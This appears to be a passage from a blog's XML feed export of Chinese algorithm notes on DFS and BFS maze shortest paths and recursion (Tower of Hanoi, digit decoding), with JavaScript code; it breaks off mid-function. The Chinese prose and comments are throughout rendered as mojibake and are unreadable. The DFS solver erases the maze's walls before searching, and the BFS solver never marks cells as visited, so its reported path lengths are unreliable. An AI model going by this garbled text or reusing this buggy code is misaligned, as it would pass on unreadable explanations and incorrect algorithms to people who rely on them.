è®¿é—®æ‰€æœ‰é¡¶ç‚¹çš„æ—¶é—´ä¸º O(V)ï¼Œè€ŒæŸ¥æ‰¾æ‰€æœ‰é¡¶ç‚¹çš„é‚»å±…ä¸€å…±éœ€è¦ O(E) çš„æ—¶é—´ï¼Œæ‰€ä»¥æ€»çš„æ—¶é—´å¤æ‚åº¦æ˜¯ O(V + E)ã€‚ é‚»æŽ¥çŸ©é˜µ æŸ¥æ‰¾æ¯ä¸ªé¡¶ç‚¹çš„é‚»å±…éœ€è¦ O(V) çš„æ—¶é—´ï¼Œæ‰€ä»¥æŸ¥æ‰¾æ•´ä¸ªçŸ©é˜µçš„æ—¶å€™éœ€è¦ O(V2) çš„æ—¶é—´ã€‚ ä¸¾ä¾‹ï¼šåˆ©ç”¨ DFS åœ¨è¿·å®«é‡Œæ‰¾ä¸€æ¡è·¯å¾„çš„å¤æ‚åº¦ã€‚è¿·å®«æ˜¯ç”¨çŸ©é˜µè¡¨ç¤ºã€‚ è§£æ³•ï¼šæŠŠè¿·å®«çœ‹æˆæ˜¯é‚»æŽ¥çŸ©é˜µã€‚å‡è®¾çŸ©é˜µæœ‰ M è¡Œ N åˆ—ï¼Œé‚£ä¹ˆä¸€å…±æœ‰ M Ã— N ä¸ªé¡¶ç‚¹ï¼Œå› æ­¤æ—¶é—´å¤æ‚åº¦å°±æ˜¯ O(M Ã— N)ã€‚ ç©ºé—´å¤æ‚åº¦ï¼š DFS éœ€è¦å †æ ˆæ¥è¾…åŠ©ï¼Œåœ¨æœ€åæƒ…å†µä¸‹ï¼Œå¾—æŠŠæ‰€æœ‰é¡¶ç‚¹éƒ½åŽ‹å…¥å †æ ˆé‡Œï¼Œæ‰€ä»¥å®ƒçš„ç©ºé—´å¤æ‚åº¦æ˜¯ O(V)ï¼Œå³ O(M Ã— N)ã€‚ DFS å¯»æ‰¾æœ€çŸ­è·¯å¾„æ€è·¯ 1ï¼šæš´åŠ›æ³•ã€‚ å¯»æ‰¾å‡ºæ‰€æœ‰çš„è·¯å¾„ï¼Œç„¶åŽæ¯”è¾ƒå®ƒä»¬çš„é•¿çŸ­ï¼Œæ‰¾å‡ºæœ€çŸ­çš„é‚£ä¸ªã€‚æ­¤æ—¶å¿…é¡»å°è¯•æ‰€æœ‰çš„å¯èƒ½ã€‚å› ä¸º DFS è§£å†³çš„åªæ˜¯è¿žé€šæ€§é—®é¢˜ï¼Œä¸æ˜¯ç”¨æ¥æ±‚è§£æœ€çŸ­è·¯å¾„é—®é¢˜çš„ã€‚ æ€è·¯ 2ï¼šä¼˜åŒ–æ³•ã€‚ ä¸€è¾¹å¯»æ‰¾ç›®çš„åœ°ï¼Œä¸€è¾¹è®°å½•å®ƒå’Œèµ·å§‹ç‚¹çš„è·ç¦»ï¼ˆä¹Ÿå°±æ˜¯æ­¥æ•°ï¼‰ã€‚ä»ŽæŸæ–¹å‘åˆ°è¾¾è¯¥ç‚¹æ‰€éœ€è¦çš„æ­¥æ•°æ›´å°‘ï¼Œåˆ™æ›´æ–°ã€‚ ä»Žå„æ–¹å‘åˆ°è¾¾è¯¥ç‚¹æ‰€éœ€è¦çš„æ­¥æ•°éƒ½æ›´å¤šï¼Œåˆ™ä¸å†å°è¯•ã€‚ DFS å¯»æ‰¾æœ€çŸ­è·¯å¾„ä»£ç å®žçŽ°12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788// é€šè¿‡ DFS ç®—æ³•æ±‚æœ€çŸ­è·¯å¾„// è®°å½•æ¯ä¸€æ­¥å’Œèµ·å§‹ç‚¹çš„è·ç¦»// ä»ŽæŸæ–¹å‘åˆ°è¾¾è¯¥ç‚¹æ‰€éœ€çš„æ­¥æ•°æ›´å°‘ï¼Œåˆ™æ›´æ–°ã€‚ä»Žå„ä¸ªæ–¹å‘åˆ°è¾¾è¯¥ç‚¹æ‰€éœ€è¦çš„æ­¥æ•°éƒ½æ›´å¤šï¼Œåˆ™ä¸å†å°è¯•// ç›®æ ‡ç‚¹const target = [4, 2]// èµ·ç‚¹const begain = [0, 3]// æ°´å¹³æ–¹å‘åç§»é‡const dx = function (d) &#123; switch (d) &#123; case 0: return 1 case 1: return 0 case 2: return -1 case 3: return 0 &#125;&#125;// ç«–ç›´æ–¹å‘åç§»é‡const dy = function (d) &#123; switch (d) &#123; case 0: return 0 case 1: return 1 case 2: return 0 case 3: return -1 &#125;&#125;// æ˜¯å¦åœ¨å®‰å…¨èŒƒå›´ï¼šæœªè¶…ç•Œå¹¶ä¸”ä¸åœ¨éšœç¢ä¸Šconst isSafe = function (maze, i, j) &#123; return i &gt;= 0 &amp;&amp; i &lt; maze.length &amp;&amp; j &gt;= 0 &amp;&amp; j &lt; maze[0].length &amp;&amp; maze[i][j] !== -1&#125;const solve = function (maze) &#123; // ç¬¬ä¸€æ­¥ï¼Œé™¤äº†èµ·å§‹ç‚¹å¤–ï¼Œå…¶ä»–ç‚¹éƒ½ç”¨ MAX_VALUE æ›¿ä»£ for (let i = 0; i &lt; maze.length; i++) &#123; maze[i].fill(Number.MAX_VALUE) &#125; maze[begain[0]][begain[1]] = 0 // ç¬¬äºŒæ­¥ï¼Œè¿›è¡Œä¼˜åŒ–çš„ DFS æ“ä½œ dfs(maze, ...begain) // ç¬¬ä¸‰æ­¥ï¼Œæ˜¯å¦æ‰¾åˆ°äº†ç›®çš„åœ° if (maze[target[0]][target[1]] &lt; Number.MAX_VALUE) &#123; console.log('shortest path count is: ', maze[target[0]][target[1]]) &#125; else &#123; console.log('can not find target') &#125;&#125;const dfs = function (maze, x, y) &#123; // ç¬¬ä¸€æ­¥ï¼Œåˆ¤æ–­æ˜¯å¦æ‰¾åˆ°äº†ç›®æ ‡ç‚¹ if (x === target[0] &amp;&amp; y === target[1]) return // ç¬¬äºŒæ­¥ï¼Œåœ¨å››ä¸ªæ–¹å‘ä¸Šå°è¯• for (let d = 0; d &lt; 4; d++) &#123; let i = x + dx(d) let j = y + dy(d) // åˆ¤æ–­ä¸‹ä¸€ä¸ªç‚¹çš„æ­¥æ•°æ˜¯å¦æ¯”ç›®å‰çš„æ­¥æ•°+1è¿˜è¦å¤§ if (isSafe(maze, i, j) &amp;&amp; maze[i][j] &gt; maze[x][y] + 1) &#123; // å¦‚æžœæ˜¯ï¼Œæ›´æ–°ä¸‹ä¸€ä¸ªç‚¹çš„æ­¥æ•°ï¼Œå¹¶ç»§ç»­ DFS ä¸‹åŽ» maze[i][j] = maze[x][y] + 1 dfs(maze, i, j) &#125; &#125;&#125;const maze = [ [0, 0, 0, 0, 0, 0], [0, 0, -1, 0, 0, 0], [0, 0, -1, 0, 0, 0], [0, 0, -1, 0, 0, 0], [0, -1, 0, 0, 0, 0], [0, 0, 0, 0, 0, -1]]solve(maze) å¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆBreadth-First Search / BFSï¼‰å¹¿åº¦ä¼˜å…ˆæœç´¢ï¼Œä¸€èˆ¬ç”¨æ¥è§£å†³æœ€çŸ­è·¯å¾„çš„é—®é¢˜ã€‚å’Œæ·±åº¦ä¼˜å…ˆæœç´¢ä¸åŒï¼Œå¹¿åº¦ä¼˜å…ˆçš„æœç´¢æ˜¯ä»Žèµ·å§‹ç‚¹å‡ºå‘ï¼Œä¸€å±‚ä¸€å±‚åœ°è¿›è¡Œï¼Œæ¯å±‚å½“ä¸­çš„ç‚¹è·ç¦»èµ·å§‹ç‚¹çš„æ­¥æ•°éƒ½æ˜¯ç›¸åŒçš„ï¼Œå½“æ‰¾åˆ°äº†ç›®çš„åœ°ä¹‹åŽå°±å¯ä»¥ç«‹å³ç»“æŸã€‚ å¹¿åº¦ä¼˜å…ˆçš„æœç´¢å¯ä»¥åŒæ—¶ä»Žèµ·å§‹ç‚¹å’Œç»ˆç‚¹å¼€å§‹è¿›è¡Œï¼Œç§°ä¹‹ä¸ºåŒç«¯ BFSã€‚è¿™ç§ç®—æ³•å¾€å¾€å¯ä»¥å¤§å¤§åœ°æé«˜æœç´¢çš„æ•ˆçŽ‡ã€‚ ä¸¾ä¾‹ï¼šåœ¨ç¤¾äº¤åº”ç”¨ç¨‹åºä¸­ï¼Œä¸¤ä¸ªäººä¹‹é—´éœ€è¦ç»è¿‡å¤šå°‘ä¸ªæœ‹å‹çš„ä»‹ç»æ‰èƒ½äº’ç›¸è®¤è¯†å¯¹æ–¹ã€‚ è§£æ³•ï¼š åªä»Žä¸€ä¸ªæ–¹å‘è¿›è¡Œ BFSï¼Œæœ‰æ—¶å€™è¿™ä¸ªäººè®¤è¯†çš„æœ‹å‹ç‰¹åˆ«å¤šï¼Œé‚£ä¹ˆä¼šå¯¼è‡´æœç´¢èµ·æ¥éžå¸¸æ…¢ï¼› å¦‚æžœå¦å¤–ä¸€æ–¹è®¤è¯†çš„äººæ¯”è¾ƒå°‘ï¼Œä»Žè¿™ä¸€æ–¹è¿›è¡Œæœç´¢ï¼Œå°±èƒ½æžå¤§åœ°å‡å°‘æœç´¢çš„æ¬¡æ•°ï¼› æ¯æ¬¡åœ¨å†³å®šä»Žå“ªä¸€è¾¹è¿›è¡Œæœç´¢çš„æ—¶å€™ï¼Œè¦åˆ¤æ–­ä¸€ä¸‹å“ªè¾¹è®¤è¯†çš„äººæ¯”è¾ƒå°‘ï¼Œç„¶åŽä»Žé‚£è¾¹è¿›è¡Œæœç´¢ã€‚ BFS éåŽ†ä¾‹é¢˜ï¼šå‡è®¾æˆ‘ä»¬æœ‰è¿™ä¹ˆä¸€ä¸ªå›¾ï¼Œé‡Œé¢æœ‰ Aã€Bã€Cã€Dã€Eã€Fã€Gã€H 8 ä¸ªé¡¶ç‚¹ï¼Œç‚¹å’Œç‚¹ä¹‹é—´çš„è”ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå¯¹è¿™ä¸ªå›¾è¿›è¡Œæ·±åº¦ä¼˜å…ˆçš„éåŽ†ã€‚ BFS éåŽ†è§£é¢˜æ€è·¯ä¾èµ–é˜Ÿåˆ—ï¼ˆQueueï¼‰ï¼Œå…ˆè¿›å…ˆå‡ºï¼ˆFIFOï¼‰ã€‚ ä¸€å±‚ä¸€å±‚åœ°æŠŠä¸ŽæŸä¸ªç‚¹ç›¸è¿žçš„ç‚¹æ”¾å…¥é˜Ÿåˆ—ä¸­ï¼Œå¤„ç†èŠ‚ç‚¹çš„æ—¶å€™æ­£å¥½æŒ‰ç…§å®ƒä»¬è¿›å…¥é˜Ÿåˆ—çš„é¡ºåºè¿›è¡Œã€‚ ç¬¬ä¸€æ­¥ï¼Œé€‰æ‹©ä¸€ä¸ªèµ·å§‹é¡¶ç‚¹ï¼Œè®©æˆ‘ä»¬ä»Žé¡¶ç‚¹ A å¼€å§‹ã€‚æŠŠ A åŽ‹å…¥é˜Ÿåˆ—ï¼Œæ ‡è®°å®ƒä¸ºè®¿é—®è¿‡ï¼ˆç”¨çº¢è‰²æ ‡è®°ï¼‰ã€‚ ç¬¬äºŒæ­¥ï¼Œä»Žé˜Ÿåˆ—çš„å¤´å–å‡ºé¡¶ç‚¹ Aï¼Œæ‰“å°è¾“å‡ºåˆ°ç»“æžœä¸­ï¼ŒåŒæ—¶å°†ä¸Žå®ƒç›¸è¿žçš„å°šæœªè¢«è®¿é—®è¿‡çš„ç‚¹æŒ‰ç…§å­—æ¯å¤§å°é¡ºåºåŽ‹å…¥é˜Ÿåˆ—ï¼ŒåŒæ—¶æŠŠå®ƒä»¬éƒ½æ ‡è®°ä¸ºè®¿é—®è¿‡ï¼Œé˜²æ­¢å®ƒä»¬è¢«é‡å¤åœ°æ·»åŠ åˆ°é˜Ÿåˆ—ä¸­ã€‚ ç¬¬ä¸‰æ­¥ï¼Œä»Žé˜Ÿåˆ—çš„å¤´å–å‡ºé¡¶ç‚¹ Bï¼Œæ‰“å°è¾“å‡ºå®ƒï¼ŒåŒæ—¶å°†ä¸Žå®ƒç›¸è¿žçš„å°šæœªè¢«è®¿é—®è¿‡çš„ç‚¹ï¼ˆä¹Ÿå°±æ˜¯ E å’Œ Fï¼‰åŽ‹å…¥é˜Ÿåˆ—ï¼ŒåŒæ—¶æŠŠå®ƒä»¬éƒ½æ ‡è®°ä¸ºè®¿é—®è¿‡ã€‚ ç¬¬å››æ­¥ï¼Œç»§ç»­ä»Žé˜Ÿåˆ—çš„å¤´å–å‡ºé¡¶ç‚¹ Dï¼Œæ‰“å°è¾“å‡ºå®ƒï¼Œæ­¤æ—¶æˆ‘ä»¬å‘çŽ°ï¼Œä¸Ž D ç›¸è¿žçš„é¡¶ç‚¹ A å’Œ F éƒ½è¢«æ ‡è®°è®¿é—®è¿‡äº†ï¼Œæ‰€ä»¥å°±ä¸è¦æŠŠå®ƒä»¬åŽ‹å…¥é˜Ÿåˆ—é‡Œã€‚ ç¬¬äº”æ­¥ï¼ŒæŽ¥ä¸‹æ¥ï¼Œé˜Ÿåˆ—çš„å¤´æ˜¯é¡¶ç‚¹ Gï¼Œæ‰“å°è¾“å‡ºå®ƒï¼ŒåŒæ ·çš„ï¼ŒG å‘¨å›´çš„ç‚¹éƒ½è¢«æ ‡è®°è®¿é—®è¿‡äº†ã€‚æˆ‘ä»¬ä¸åšä»»ä½•å¤„ç†ã€‚ ç¬¬å…­æ­¥ï¼Œé˜Ÿåˆ—çš„å¤´æ˜¯ Eï¼Œæ‰“å°è¾“å‡ºå®ƒï¼Œå®ƒå‘¨å›´çš„ç‚¹ä¹Ÿéƒ½è¢«æ ‡è®°ä¸ºè®¿é—®è¿‡äº†ï¼Œæˆ‘ä»¬ä¸åšä»»ä½•å¤„ç†ã€‚ ç¬¬ä¸ƒæ­¥ï¼ŒæŽ¥ä¸‹æ¥è½®åˆ°é¡¶ç‚¹ Fï¼Œæ‰“å°è¾“å‡ºå®ƒï¼Œå°† C åŽ‹å…¥é˜Ÿåˆ—ï¼Œå¹¶æ ‡è®° C ä¸ºè®¿é—®è¿‡ã€‚ ç¬¬å…«æ­¥ï¼Œå°† C ä»Žé˜Ÿåˆ—ä¸­ç§»å‡ºï¼Œæ‰“å°è¾“å‡ºå®ƒï¼Œä¸Žå®ƒç›¸è¿žçš„ H è¿˜æ²¡è¢«è®¿é—®åˆ°ï¼Œå°† H åŽ‹å…¥é˜Ÿåˆ—ï¼Œå°†å®ƒæ ‡è®°ä¸ºè®¿é—®è¿‡ã€‚ ç¬¬ä¹æ­¥ï¼Œé˜Ÿåˆ—é‡Œåªå‰©ä¸‹ H äº†ï¼Œå°†å®ƒç§»å‡ºï¼Œæ‰“å°è¾“å‡ºå®ƒï¼Œå‘çŽ°å®ƒçš„é‚»å±…éƒ½è¢«è®¿é—®è¿‡äº†ï¼Œä¸åšä»»ä½•äº‹æƒ…ã€‚ ç¬¬åæ­¥ï¼Œé˜Ÿåˆ—ä¸ºç©ºï¼Œè¡¨ç¤ºæ‰€æœ‰çš„ç‚¹éƒ½è¢«å¤„ç†å®Œæ¯•äº†ï¼Œç¨‹åºç»“æŸã€‚ è¿·å®«æœ€çŸ­è·¯å¾„é—®é¢˜è¿ç”¨å¹¿åº¦ä¼˜å…ˆæœç´¢çš„ç®—æ³•åœ¨è¿·å®«ä¸­å¯»æ‰¾æœ€çŸ­çš„è·¯å¾„ã€‚ è¿·å®«æœ€çŸ­è·¯å¾„é—®é¢˜è§£é¢˜æ€è·¯æœç´¢çš„è¿‡ç¨‹å¦‚ä¸‹ã€‚ ä»Žèµ·å§‹ç‚¹ A å‡ºå‘ï¼Œç±»ä¼¼äºŽæ¶Ÿæ¼ªï¼Œä¸€å±‚ä¸€å±‚åœ°æ‰«æï¼Œé¿å¼€å¢™å£ï¼ŒåŒæ—¶æŠŠæ¯ä¸ªç‚¹ä¸Ž A çš„è·ç¦»æˆ–è€…æ­¥æ•°æ ‡è®°ä¸Šã€‚å½“æ‰¾åˆ°ç›®çš„åœ°çš„æ—¶å€™è¿”å›žæ­¥æ•°ï¼Œè¿™ä¸ªæ­¥æ•°ä¿è¯æ˜¯æœ€çŸ­çš„ã€‚ è¿·å®«æœ€çŸ­è·¯å¾„é—®é¢˜ä»£ç å®žçŽ°12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576// ç›®æ ‡ç‚¹const target = [4, 2]// èµ·ç‚¹const begain = [0, 3]// æ°´å¹³æ–¹å‘åç§»é‡const dx = function (d) &#123; switch (d) &#123; case 0: return 1 case 1: return 0 case 2: return -1 case 3: return 0 &#125;&#125;// ç«–ç›´æ–¹å‘åç§»é‡const dy = function (d) &#123; switch (d) &#123; case 0: return 0 case 1: return 1 case 2: return 0 case 3: return -1 &#125;&#125;// æ˜¯å¦åœ¨å®‰å…¨èŒƒå›´ï¼šæœªè¶…ç•Œå¹¶ä¸”ä¸åœ¨éšœç¢ä¸Šconst isSafe = function (maze, i, j) &#123; return i &gt;= 0 &amp;&amp; i &lt; maze.length &amp;&amp; j &gt;= 0 &amp;&amp; j &lt; maze[0].length &amp;&amp; maze[i][j] !== -1&#125;const bfs = function (maze, x, y) &#123; const queue = [] queue.push([x, y]) while (queue.length) &#123; // ä»Žé˜Ÿåˆ—å¤´å–å‡ºå½“å‰ç‚¹ const pos = queue.shift() x = pos[0] y = pos[1] // ä»Žå››ä¸ªæ–¹å‘è¿›è¡Œ BFS for (let d = 0; d &lt; 4; d++) &#123; let i = x + dx(d) let j = y + dy(d) if (isSafe(maze, i, j)) &#123; // è®°å½•æ­¥æ•°ï¼ˆæ ‡è®°è®¿é—®è¿‡ï¼‰ maze[i][j] = maze[x][y] + 1 // ç„¶åŽæ·»åŠ åˆ°é˜Ÿåˆ—ä¸­ queue.push([i, j]) // å¦‚æžœå‘çŽ°äº†ç›®çš„åœ°å°±è¿”å›ž if (i === target[0] &amp;&amp; j === target[1]) return &#125; &#125; &#125;&#125;const maze = [ [0, 0, 0, 0, 0, 0], [0, 0, -1, 0, 0, 0], [0, 0, -1, 0, 0, 0], [0, 0, -1, 0, 0, 0], [0, -1, 0, 0, 0, 0], [0, 0, 0, 0, 0, -1]]bfs(maze, 0, 3)console.log('shortest path count is: ', maze[target[0]][target[1]]) BFS ç®—æ³•åˆ†æžåŒæ ·å€ŸåŠ©å›¾è®ºçš„åˆ†æžæ–¹æ³•ï¼Œå‡è®¾æœ‰ V ä¸ªé¡¶ç‚¹ï¼ŒE æ¡è¾¹ã€‚ æ—¶é—´å¤æ‚åº¦ï¼š é‚»æŽ¥è¡¨ æ¯ä¸ªé¡¶ç‚¹éƒ½éœ€è¦è¢«è®¿é—®ä¸€æ¬¡ï¼Œæ—¶é—´å¤æ‚åº¦æ˜¯ O(V)ï¼›ç›¸è¿žçš„é¡¶ç‚¹ï¼ˆä¹Ÿå°±æ˜¯æ¯æ¡è¾¹ï¼‰ä¹Ÿéƒ½è¦è¢«è®¿é—®ä¸€æ¬¡ï¼ŒåŠ èµ·æ¥å°±æ˜¯ O(E)ã€‚å› æ­¤æ•´ä½“æ—¶é—´å¤æ‚åº¦å°±æ˜¯ O(V+E)ã€‚ é‚»æŽ¥çŸ©é˜µ V ä¸ªé¡¶ç‚¹ï¼Œæ¯æ¬¡éƒ½è¦æ£€æŸ¥æ¯ä¸ªé¡¶ç‚¹ä¸Žå…¶ä»–é¡¶ç‚¹æ˜¯å¦æœ‰è”ç³»ï¼Œå› æ­¤æ—¶é—´å¤æ‚åº¦æ˜¯ O(V2)ã€‚ ä¸¾ä¾‹ï¼šåœ¨è¿·å®«é‡Œè¿›è¡Œ BFS æœç´¢ã€‚ è§£æ³•ï¼šç”¨é‚»æŽ¥çŸ©é˜µã€‚å‡è®¾çŸ©é˜µæœ‰ M è¡Œ N åˆ—ï¼Œé‚£ä¹ˆä¸€å…±æœ‰ MÃ—N ä¸ªé¡¶ç‚¹ï¼Œæ—¶é—´å¤æ‚åº¦å°±æ˜¯ O(MÃ—N)ã€‚ ç©ºé—´å¤æ‚åº¦ï¼š éœ€è¦å€ŸåŠ©ä¸€ä¸ªé˜Ÿåˆ—ï¼Œæ‰€æœ‰é¡¶ç‚¹éƒ½è¦è¿›å…¥é˜Ÿåˆ—ä¸€æ¬¡ï¼Œä»Žé˜Ÿåˆ—å¼¹å‡ºä¸€æ¬¡ã€‚åœ¨æœ€åçš„æƒ…å†µä¸‹ï¼Œç©ºé—´å¤æ‚åº¦æ˜¯ O(V)ï¼Œå³ O(MÃ—N)ã€‚]]></content>
      <tags>
        <tag>javascript</tag>
        <tag>algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ã€Œè¶…è¯¦ç¬”è®°ã€ç®—æ³•â€”â€”é€’å½’ä¸Žå›žæº¯ï¼ˆJSç‰ˆï¼‰]]></title>
    <url>%2F2020%2F11%2F06%2Falgorithm-recursion-backtracking%2F</url>
    <content type="text"><![CDATA[é€’å½’å’Œå›žæº¯çš„å…³ç³»å¯†ä¸å¯åˆ†ï¼šé€’å½’çš„åŸºæœ¬æ€§è´¨å°±æ˜¯å‡½æ•°è°ƒç”¨ï¼Œåœ¨å¤„ç†é—®é¢˜çš„æ—¶å€™ï¼Œé€’å½’å¾€å¾€æ˜¯æŠŠä¸€ä¸ªå¤§è§„æ¨¡çš„é—®é¢˜ä¸æ–­åœ°å˜å°ç„¶åŽè¿›è¡ŒæŽ¨å¯¼çš„è¿‡ç¨‹ã€‚å›žæº¯åˆ™æ˜¯åˆ©ç”¨é€’å½’çš„æ€§è´¨ï¼Œä»Žé—®é¢˜çš„èµ·å§‹ç‚¹å‡ºå‘ï¼Œä¸æ–­åœ°è¿›è¡Œå°è¯•ï¼Œå›žå¤´ä¸€æ­¥ç”šè‡³å¤šæ­¥å†åšé€‰æ‹©ï¼Œç›´åˆ°æœ€ç»ˆæŠµè¾¾ç»ˆç‚¹çš„è¿‡ç¨‹ã€‚ é€’å½’ï¼ˆRecursionï¼‰é€’å½’ç®—æ³•æ€æƒ³é€’å½’ç®—æ³•æ˜¯ä¸€ç§è°ƒç”¨è‡ªèº«å‡½æ•°çš„ç®—æ³•ï¼ˆäºŒå‰æ ‘çš„è®¸å¤šæ€§è´¨åœ¨å®šä¹‰ä¸Šå°±æ»¡è¶³é€’å½’ï¼‰ã€‚ æ±‰è¯ºå¡”é—®é¢˜æœ‰ä¸‰ä¸ªå¡” Aã€Bã€Cï¼Œä¸€å¼€å§‹çš„æ—¶å€™ï¼Œåœ¨å¡” A ä¸Šæ”¾ç€ n ä¸ªç›˜å­ï¼Œå®ƒä»¬è‡ªåº•å‘ä¸ŠæŒ‰ç…§ä»Žå¤§åˆ°å°çš„é¡ºåºå æ”¾ã€‚çŽ°åœ¨è¦æ±‚å°†å¡” A ä¸­æ‰€æœ‰çš„ç›˜å­æ¬åˆ°å¡” C ä¸Šï¼Œè®©ä½ æ‰“å°å‡ºæ¬è¿çš„æ­¥éª¤ã€‚åœ¨æ¬è¿çš„è¿‡ç¨‹ä¸­ï¼Œæ¯æ¬¡åªèƒ½æ¬è¿ä¸€ä¸ªç›˜å­ï¼Œå¦å¤–ï¼Œä»»ä½•æ—¶å€™ï¼Œæ— è®ºåœ¨å“ªä¸ªå¡”ä¸Šï¼Œå¤§ç›˜å­ä¸èƒ½æ”¾åœ¨å°ç›˜å­çš„ä¸Šé¢ã€‚ æ±‰è¯ºå¡”é—®é¢˜è§£æ³• ä»Žæœ€ç»ˆçš„ç»“æžœå‡ºå‘ï¼Œè¦æŠŠ n ä¸ªç›˜å­æŒ‰ç…§å¤§å°é¡ºåºå æ”¾åœ¨å¡” C ä¸Šï¼Œå°±éœ€è¦å°†å¡” A çš„åº•éƒ¨æœ€å¤§çš„ç›˜å­æ¬åˆ°å¡” Cï¼› ä¸ºäº†å®žçŽ°æ­¥éª¤ 1ï¼Œéœ€è¦å°†é™¤äº†è¿™ä¸ªæœ€å¤§ç›˜å­ä¹‹å¤–çš„å…¶ä½™ç›˜å­éƒ½æ”¾åˆ°å¡” B ä¸Šã€‚ ç”±ä¸Šå¯çŸ¥ï¼Œå°†åŽŸæ¥çš„é—®é¢˜è§„æ¨¡ä»Ž n ä¸ªç›˜å­å˜æˆäº† n-1 ä¸ªç›˜å­ï¼Œå³å°† n-1 ä¸ªç›˜å­è½¬ç§»åˆ°å¡” B ä¸Šã€‚ å¦‚æžœä¸€ä¸ªå‡½æ•°ï¼Œèƒ½å°† n ä¸ªç›˜å­ä»Žå¡” Aï¼Œå€ŸåŠ©å¡” Bï¼Œæ¬åˆ°å¡” Cã€‚é‚£ä¹ˆï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨è¯¥å‡½æ•°å°† n-1 ä¸ªç›˜å­ä»Žå¡” Aï¼Œå€ŸåŠ©å¡” Cï¼Œæ¬åˆ°å¡” Bã€‚åŒç†ï¼Œä¸æ–­åœ°æŠŠé—®é¢˜è§„æ¨¡å˜å°ï¼Œå½“ n ä¸º 1ï¼Œä¹Ÿå°±æ˜¯åªæœ‰ 1 ä¸ªç›˜å­çš„æ—¶å€™ï¼Œç›´æŽ¥æ‰“å°å‡ºæ­¥éª¤ã€‚ æ±‰è¯ºå¡”é—®é¢˜ä»£ç ç¤ºä¾‹12345678910111213141516171819202122// æ±‰è¯ºå¡”é—®é¢˜const hano = function (A, B, C, n) &#123; if (n &gt; 0) &#123; hano(A, C, B, n - 1) move(A, C) hano(B, A, C, n - 1) &#125;&#125;const move = function (p, c) &#123; const temp = p.pop() c.push(temp)&#125;const a = [1, 2, 3, 4, 5]const b = []const c = []hano(a, b, c, a.length)console.log('----after----')console.log('a: ', String(a)) //console.log('b: ', String(b)) //console.log('c: ', String(c)) // 1, 2, 3, 4, 5 ç”±ä¸Šè¿°æ€»ç»“å‡ºé€’å½’çš„ç®—æ³•æ€æƒ³ï¼Œå°†ä¸€ä¸ªé—®é¢˜çš„è§„æ¨¡å˜å°ï¼Œç„¶åŽå†åˆ©ç”¨ä»Žå°è§„æ¨¡é—®é¢˜ä¸­å¾—å‡ºçš„ç»“æžœï¼Œç»“åˆå½“å‰çš„å€¼æˆ–è€…æƒ…å†µï¼Œå¾—å‡ºæœ€ç»ˆçš„ç»“æžœã€‚ é€šä¿—æ¥è¯´ï¼ŒæŠŠè¦å®žçŽ°çš„é€’å½’å‡½æ•°çœ‹æˆæ˜¯å·²ç»å®žçŽ°å¥½çš„ï¼Œ ç›´æŽ¥åˆ©ç”¨è§£å†³ä¸€äº›å­é—®é¢˜ï¼Œç„¶åŽéœ€è¦è€ƒè™‘çš„å°±æ˜¯å¦‚ä½•æ ¹æ®å­é—®é¢˜çš„è§£ä»¥åŠå½“å‰é¢å¯¹çš„æƒ…å†µå¾—å‡ºç­”æ¡ˆã€‚è¿™ç§ç®—æ³•ä¹Ÿè¢«ç§°ä¸ºè‡ªé¡¶å‘ä¸‹ï¼ˆTop-Downï¼‰çš„ç®—æ³•ã€‚ æ•°å­—è§£ç é—®é¢˜LeetCode ç¬¬ 91 é¢˜ï¼Œè§£ç çš„æ–¹æ³•ã€‚ä¸€æ¡åŒ…å«å­—æ¯ A-Z çš„æ¶ˆæ¯é€šè¿‡ä»¥ä¸‹æ–¹å¼è¿›è¡Œäº†ç¼–ç ï¼šâ€˜Aâ€™ -&gt; 1â€˜Bâ€™ -&gt; 2â€¦â€˜Zâ€™ -&gt; 26ç»™å®šä¸€ä¸ªåªåŒ…å«æ•°å­—çš„éžç©ºå­—ç¬¦ä¸²ï¼Œè¯·è®¡ç®—è§£ç æ–¹æ³•çš„æ€»æ•°ã€‚ æ•°å­—è§£ç è§£é¢˜æ€è·¯ å°±ä¾‹é¢˜ä¸­çš„ç¬¬äºŒä¸ªä¾‹å­ï¼Œç»™å®šç¼–ç åŽçš„æ¶ˆæ¯æ˜¯å­—ç¬¦ä¸²â€œ226â€ï¼Œå¦‚æžœå¯¹å…¶ä¸­â€œ22â€çš„è§£ç æœ‰ m ç§å¯èƒ½ï¼Œé‚£ä¹ˆï¼ŒåŠ å¤šä¸€ä¸ªâ€œ6â€åœ¨æœ€åŽï¼Œç›¸å½“äºŽåœ¨æœ€ç»ˆè§£å¯†å‡ºæ¥çš„å­—ç¬¦ä¸²é‡Œå¤šäº†ä¸€ä¸ªâ€œFâ€å­—ç¬¦è€Œå·²ï¼Œæ€»ä½“çš„è§£ç è¿˜æ˜¯åªæœ‰ m ç§ã€‚ å¯¹äºŽâ€œ6â€è€Œè¨€ï¼Œå¦‚æžœå®ƒçš„å‰é¢æ˜¯â€1â€æˆ–è€…â€œ2â€ï¼Œé‚£ä¹ˆå®ƒå°±æœ‰å¯èƒ½æ˜¯â€œ16â€ï¼Œâ€œ26â€ï¼Œæ‰€ä»¥è¿˜å¯ä»¥å†å¾€å‰çœ‹ä¸€ä¸ªå­—ç¬¦ï¼Œå‘çŽ°å®ƒæ˜¯â€œ26â€ã€‚è€Œå‰é¢çš„è§£ç ç»„åˆæ˜¯ k ä¸ªï¼Œé‚£ä¹ˆåœ¨è¿™ k ä¸ªè§£å‡ºçš„ç¼–ç é‡Œï¼Œæ·»åŠ ä¸€ä¸ªâ€œZâ€ï¼Œæ‰€ä»¥æ€»çš„è§£ç ä¸ªæ•°å°±æ˜¯ m+kã€‚ æ•°å­—è§£ç ä»£ç å®žçŽ°123456789101112131415161718192021222324252627const numDecoding = function (str) &#123; if (str.charAt(0) === '0') return 0 const chars = [...str] return decode(chars, chars.length - 1)&#125;// å­—ç¬¦ä¸²è½¬åŒ–æˆå­—ç¬¦ç»„ï¼Œåˆ©ç”¨é€’å½’å‡½æ•° decodeï¼Œä»Žæœ€åŽä¸€ä¸ªå­—ç¬¦ä¸²å‘å‰é€’å½’const decode = function (chars, index) &#123; if (index &lt;= 0) return 1 let count = 0 let curr = chars[index] let prev = chars[index - 1] // å½“å‰å­—ç¬¦æ¯” `0` 